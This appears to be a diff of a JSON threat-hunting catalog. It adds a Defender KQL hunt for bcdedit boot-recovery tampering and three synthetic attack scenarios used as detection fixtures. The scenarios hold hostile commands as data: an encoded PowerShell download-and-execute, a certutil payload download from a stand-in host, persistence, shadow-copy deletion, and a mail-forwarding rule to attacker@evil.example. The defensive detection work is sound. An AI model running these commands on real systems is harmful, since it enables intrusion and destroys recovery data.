+      "hypothesis": "An adversary executes bcdedit.exe commands to disable Windows Startup Repair and boot error handling immediately prior to executing ransomware encryption, preventing victim machines from recovering automatically.\n",
+      "logic_summary": "Filters DeviceProcessEvents for invocations of bcdedit.exe where command-line switches include 'recoveryenabled', 'bootstatuspolicy', or 'ignoreallfailures', classifying the tampered boot configuration.\n",
+      "parameters": [
+        {
+          "name": "lookback",
+          "default": "7d",
+          "description": "Historical search window to inspect"
+        }
+      ],
+      "false_positives": [
+        "Enterprise OS imaging, system deployment scripts, or hypervisor template provisioning workflows",
+        "Authorized system administrators testing diagnostic boot environments"
+      ],
+      "tuning": [
+        "Whitelist dedicated corporate deployment scripts executing from approved imaging servers",
+        "Suppress alerts during pre-scheduled bare-metal workstation rollout windows"
+      ],
+      "triage_steps": [
+        "Review the full ProcessCommandLine to observe the exact configuration parameters modified",
+        "Inspect InitiatingProcessFileName and InitiatingProcessCommandLine (e.g. cmd.exe launched from a batch script or malicious document)",
+        "Search DeviceProcessEvents on the same host within +/- 30 minutes for shadow copy deletion (vssadmin, wmic shadowcopy)",
+        "Check for suspicious child processes or unauthorized persistence mechanisms installed concurrently"
+      ],
+      "response": "Immediately isolate the host from the corporate network, re-enable startup repair using 'bcdedit /set {default} recoveryenabled Yes', and trigger a full Defender antivirus and EDR remediation scan.\n",
+      "references": [
+        {
+          "title": "MITRE ATT&CK T1490 Inhibit System Recovery",
+          "url": "https://attack.mitre.org/techniques/T1490/"
+        },
+        {
+          "title": "Microsoft Defender Threat Intelligence on Ransomware Recovery Inhibition",
+          "url": "https://www.microsoft.com/security/blog/topic/threat-intelligence/"
+        }
+      ],
+      "query": "// Hunt: HB-RW-003 - Safe-Mode or Boot Recovery Disabled via Bcdedit\n// MITRE ATT&CK: T1490 (Inhibit System Recovery)\n// Platform: Microsoft Defender XDR (DeviceProcessEvents)\n//\n// Description: Detects the execution of bcdedit.exe with command-line switches designed\n// to disable Windows automatic startup recovery or tamper with safe-mode configuration,\n// a classic ransomware precursor designed to inhibit incident response and recovery.\n\nlet lookback = 7d;\nlet recoveryTamperingArgs = dynamic([\n    \"recoveryenabled\", \"bootstatuspolicy\", \"ignoreallfailures\", \"safeboot\"\n]);\nDeviceProcessEvents\n| where Timestamp > ago(lookback)\n| where FileName =~ \"bcdedit.exe\" or ProcessCommandLine has \"bcdedit\"\n| where ProcessCommandLine has_any (recoveryTamperingArgs)\n| extend TamperedFeature = case(\n    ProcessCommandLine has \"recoveryenabled\", \"Recovery Disabled\",\n    ProcessCommandLine has \"bootstatuspolicy\", \"Failure Policy Tampered\",\n    ProcessCommandLine has \"safeboot\", \"SafeBoot Modified\",\n    \"Other Boot Config Change\"\n)\n| project Timestamp, DeviceName, TamperedFeature, ProcessCommandLine,\n          InitiatingProcessFileName, InitiatingProcessCommandLine,\n          InitiatingProcessAccountName, AccountName, ProcessIntegrityLevel\n| order by Timestamp desc\n",
+      "tests": {
+        "passed": 2,
+        "total": 2
+      }
+    }
+  ],
+  "scenarios": [
+    {
+      "id": "scenario-01",
+      "title": "Password spray against multiple accounts followed by successful login, anomalous travel, and inbox forwarding rule",
+      "seed": 1337,
+      "window": {
+        "start": "2026-01-10T08:00:00Z",
+        "duration": "6h"
+      },
+      "baseline": {
+        "users": 50,
+        "tables": [
+          "SigninLogs",
+          "CloudAppEvents"
+        ]
+      },
+      "steps": [
+        {
+          "at": "+01:10",
+          "actor": "203.0.113.50",
+          "action": "spray",
+          "targets": 40,
+          "table": "SigninLogs",
+          "attack": "T1110.003",
+          "details": {
+            "resultType": "50126",
+            "resultDescription": "Error validating credentials due to invalid username or password."
+          }
+        },
+        {
+          "at": "+01:40",
+          "actor": "203.0.113.50",
+          "action": "success",
+          "user": "user017@contoso.test",
+          "table": "SigninLogs",
+          "attack": "T1078",
+          "details": {
+            "resultType": "0",
+            "location": "DE",
+            "app": "Office 365 Exchange Online"
+          }
+        },
+        {
+          "at": "+02:00",
+          "actor": "198.51.100.25",
+          "action": "success",
+          "user": "user017@contoso.test",
+          "table": "SigninLogs",
+          "attack": "T1078",
+          "details": {
+            "resultType": "0",
+            "location": "US",
+            "app": "Microsoft Teams"
+          }
+        },
+        {
+          "at": "+02:15",
+          "actor": "203.0.113.50",
+          "action": "new_inbox_rule",
+          "user": "user017@contoso.test",
+          "table": "CloudAppEvents",
+          "attack": "T1114.003",
+          "details": {
+            "application": "Microsoft Exchange Online",
+            "ruleParameters": "ForwardTo: attacker@evil.example; DeleteMessage: true"
+          }
+        }
+      ]
+    },
+    {
+      "id": "scenario-02",
+      "title": "Spearphishing document spawns encoded PowerShell, downloads secondary payload via Certutil, and establishes persistence",
+      "seed": 4242,
+      "window": {
+        "start": "2026-02-15T09:00:00Z",
+        "duration": "4h"
+      },
+      "baseline": {
+        "users": 30,
+        "tables": [
+          "DeviceProcessEvents",
+          "DeviceRegistryEvents"
+        ]
+      },
+      "steps": [
+        {
+          "at": "+00:15",
+          "actor": "WORKSTATION-01",
+          "user": "finance_user@contoso.test",
+          "action": "process_spawn",
+          "table": "DeviceProcessEvents",
+          "attack": "T1204.002",
+          "process": "powershell.exe",
+          "parent": "winword.exe",
+          "command": "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -s 5\""
+        },
+        {
+          "at": "+00:16",
+          "actor": "WORKSTATION-01",
+          "user": "finance_user@contoso.test",
+          "action": "encoded_powershell",
+          "table": "DeviceProcessEvents",
+          "attack": "T1059.001",
+          "process": "powershell.exe",
+          "parent": "winword.exe",
+          "command": "powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcwB0AGEAZwBpAG4AZwAuAGUAeABhAG0AcABsAGUALgBjAG8AbQAvAHAAcgBvAGYAaQBsAGUALgBwAHMAMQAnACkA"
+        },
+        {
+          "at": "+00:20",
+          "actor": "WORKSTATION-01",
+          "user": "finance_user@contoso.test",
+          "action": "lolbin_download",
+          "table": "DeviceProcessEvents",
+          "attack": "T1105",
+          "process": "certutil.exe",
+          "parent": "powershell.exe",
+          "command": "certutil.exe -urlcache -split -f http://staging.example.com/payload.exe C:\\Users\\Public\\update.exe"
+        },
+        {
+          "at": "+00:25",
+          "actor": "WORKSTATION-01",
+          "user": "finance_user@contoso.test",
+          "action": "registry_persistence",
+          "table": "DeviceRegistryEvents",
+          "attack": "T1547.001",
+          "details": {
+            "registryKey": "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+            "registryValueName": "WindowsUpdateService",
+            "registryValueData": "C:\\Users\\Public\\update.exe"
+          }
+        },
+        {
+          "at": "+00:30",
+          "actor": "WORKSTATION-01",
+          "user": "finance_user@contoso.test",
+          "action": "scheduled_task",
+          "table": "DeviceProcessEvents",
+          "attack": "T1053.005",
+          "process": "schtasks.exe",
+          "parent": "powershell.exe",
+          "command": "schtasks.exe /create /tn \"SystemHealthMonitor\" /tr \"C:\\\\Users\\\\Public\\\\update.exe\" /sc onlogon /f"
+        }
+      ]
+    },
+    {
+      "id": "scenario-03",
+      "title": "Mass cloud file staging followed by Volume Shadow Copy deletion and recovery inhibition",
+      "seed": 9999,
+      "window": {
+        "start": "2026-03-01T14:00:00Z",
+        "duration": "4h"
+      },
+      "baseline": {
+        "users": 30,
+        "tables": [
+          "CloudAppEvents",
+          "DeviceProcessEvents"
+        ]
+      },
+      "steps": [
+        {
+          "at": "+00:30",
+          "actor": "192.0.2.77",
+          "user": "admin_user@contoso.test",
+          "action": "mass_download",
+          "table": "CloudAppEvents",
+          "attack": "T1530",
+          "targets": 65,
+          "details": {
+            "application": "Microsoft SharePoint Online",
+            "activityType": "FileDownloaded"
+          }
+        },
+        {
+          "at": "+01:15",
+          "actor": "DC-SRV-01",
+          "user": "admin_user",
+          "action": "shadow_copy_deletion",
+          "table": "DeviceProcessEvents",
+          "attack": "T1490",
+          "process": "vssadmin.exe",
+          "parent": "cmd.exe",
+          "command": "vssadmin.exe delete shadows /all /quiet"
+        },
+        {
+          "at": "+01:16",
+          "actor": "DC-SRV-01",
+          "user": "admin_user",
+          "action": "wmic_shadow_deletion",
+          "table": "DeviceProcessEvents",
+          "attack": "T1490",
+          "process": "wmic.exe",
+          "parent": "cmd.exe",
+          "command": "wmic.exe shadowcopy delete /nointeractive"
+        },
+        {
+          "at": "+01:18",
+          "actor": "DC-SRV-01",
+          "user": "admin_user",
+          "action": "bcdedit_inhibit",
+          "table": "DeviceProcessEvents",
+          "attack": "T1490",
+          "process": "bcdedit.exe",
+          "parent": "cmd.exe",
+          "command": "bcdedit.exe /set {default} recoveryenabled No"
+        }
+      ]
+    }
+  ]
+}
